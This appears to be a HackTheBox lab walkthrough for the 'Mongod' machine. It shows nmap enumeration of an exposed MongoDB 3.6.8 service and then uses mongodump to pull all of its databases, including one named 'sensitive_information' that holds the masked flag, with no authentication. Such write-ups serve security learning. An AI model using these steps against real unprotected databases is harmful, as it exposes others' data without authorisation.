---
title: Mongod
image:
    path: /assets/posts/2025-11-28-mongod/1.png
date: 2025-12-05 11:00:00 +/-TTTT
categories: [HackTheBox]
tags: [HackTheBox, MongoDB, Port 27017, mongosh, mongodump]
---


---

## Enumeration

```
❯ nmap 10.129.3.97 -sCV
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 11:10 -03
Nmap scan report for 10.129.3.97 (10.129.3.97)
Host is up (0.30s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 423.73 seconds
```

```
❯ nmap 10.129.3.97 -sCV -p- --min-rate 500 -T5 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 11:18 -03
Warning: 10.129.3.97 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.3.97 (10.129.3.97)
Host is up (0.25s latency).
Not shown: 65005 closed tcp ports (reset), 528 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
27017/tcp open  mongodb MongoDB 3.6.8 3.6.8
```

```
nmap -p 27017 --script mongodb-databases 10.129.3.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 17:39 -03
Nmap scan report for 10.129.3.143 (10.129.3.143)
Host is up (0.28s latency).

PORT      STATE SERVICE
27017/tcp open  mongodb
| mongodb-databases: 
|   databases
|     4
|       sizeOnDisk = 32768.0
|       empty = false
|       name = users
|     3
|       sizeOnDisk = 32768.0
|       empty = false
|       name = sensitive_information
|     0
|       sizeOnDisk = 32768.0
|       empty = false
|       name = admin
|     2
|       sizeOnDisk = 73728.0
|       empty = false
|       name = local
|     1
|       sizeOnDisk = 73728.0
|       empty = false
|       name = config
|   ok = 1.0
|_  totalSize = 245760.0

Nmap done: 1 IP address (1 host up) scanned in 1.29 seconds
```

## Foothold

Install [MongoDB Shell](https://www.mongodb.com/try/download/shell)
```
sudo apt install ./mongodb-mongosh_2.5.10_amd64.deb
```

```
❯ mongosh "mongodb://10.129.3.143:27017"
Current Mongosh Log ID:	693341a06edf2560258de665
Connecting to:		mongodb://10.129.3.143:27017/?directConnection=true&appName=mongosh+2.5.10
MongoServerSelectionError: Server at 10.129.3.143:27017 reports maximum wire version 6, but this version of the Node.js Driver requires at least 8 (MongoDB 4.2)
```

```
❯ mongodump --host 10.129.3.143 --port 27017 --out /home/pelado/Downloads/dump
2025-12-05T17:45:13.978-0300	writing admin.system.version to /home/pelado/Downloads/dump/admin/system.version.bson
2025-12-05T17:45:14.493-0300	done dumping admin.system.version (1 document)
2025-12-05T17:45:14.780-0300	writing users.ecommerceWebapp to /home/pelado/Downloads/dump/users/ecommerceWebapp.bson
2025-12-05T17:45:15.087-0300	writing sensitive_information.flag to /home/pelado/Downloads/dump/sensitive_information/flag.bson
2025-12-05T17:45:15.703-0300	done dumping sensitive_information.flag (1 document)
2025-12-05T17:45:15.704-0300	done dumping users.ecommerceWebapp (25 documents)
```

```
❯ ls
admin  sensitive_information  users
❯ tree
.
├── admin
│   ├── system.version.bson
│   └── system.version.metadata.json
├── sensitive_information
│   ├── flag.bson
│   └── flag.metadata.json
└── users
    ├── ecommerceWebapp.bson
    └── ecommerceWebapp.metadata.json

4 directories, 6 files
```

```
❯ cat *
A_idc=%@�H�flag!XXXXXXXXXXXXXXXXXXXXX{"indexes":[{"v":{"$numberInt":"2"},"key":{"_id":{"$numberInt":"1"}},"name":"_id_","ns":"sensitive_information.flag"}],"uuid":"33c38b681cf44c54b18525b5836d4ae0","collectionName":"flag","type":"collection"}%   
```
